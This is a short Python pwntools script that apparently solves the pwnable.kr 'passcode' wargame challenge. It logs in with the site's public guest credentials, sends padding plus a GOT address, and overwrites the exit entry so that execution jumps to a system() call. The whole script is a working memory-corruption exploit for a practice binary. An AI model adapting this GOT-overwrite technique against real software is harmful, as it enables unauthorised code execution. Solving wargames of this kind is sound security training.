from pwn import *

PADDING = cyclic(96) 
EXIT_GOT_ADDR = p32(0x0804a018)
SYSTEM_ADDR = "134514135"

s = ssh(host="pwnable.kr", user="passcode", password="guest", port=2222)
p = s.process(executable="./passcode")

p.sendline(PADDING + EXIT_GOT_ADDR)
p.sendline(SYSTEM_ADDR)
p.sendline("bazinga")

print p.recvall()
#p.interactive()
